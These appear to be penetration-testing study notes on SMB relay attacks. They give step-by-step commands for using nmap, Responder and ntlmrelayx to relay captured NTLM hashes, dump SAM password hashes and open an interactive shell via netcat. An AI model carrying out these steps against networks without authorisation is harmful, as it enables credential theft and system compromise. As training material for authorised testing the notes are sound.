# SMB Relay

**SMB Relay**:

Instead of having to crack the hash we gathered from responder we can relay those hashes to specific machines to potentially gain access

For SMB relay to work there are some requirements that must be met. 

- [ ]  SMB signing must be disabled or not enforced on the target
- [ ]  Relayed user credentials must be admin on machine for any real value

To identify hosts without SMB signing run the premade script built into NMAP

```jsx
nmap --script=smb2-security-mode.nse -p445 <ip address> -Pn
```

-Pn will still probe the machine if ping does not work. -Pn treats the device as alive still

Step 1: Change the .conf file for Responder

```jsx
sudo mousepad /etc/responder/Responder.conf
```

SMB = OFF

HTTP = OFF

Step 2: Run Responder

```jsx
sudo responder -I eth0 -dwP
```

Step 3: Set up the Relay

```jsx
sudo ntlmrelayx.py -tf <target file> -smb2support
```

```jsx
sudo ntlmrelayx.py -tf <target file> -smb2support -i
```

The -i after allows for an interactive mode. With this you can locally netcat into the device and explore the system.

Step 4: Event occurs

Step 5: The Compromise

After an event occurs you will see in your CLI that the SAM has been dumped onto your screen and there will be all the usernames and hashes of that system.

If the -i was used for interactive mode create a new tab and enter the command below to begin exploring the system

```jsx
nc 127.0.0.1 11000
```

/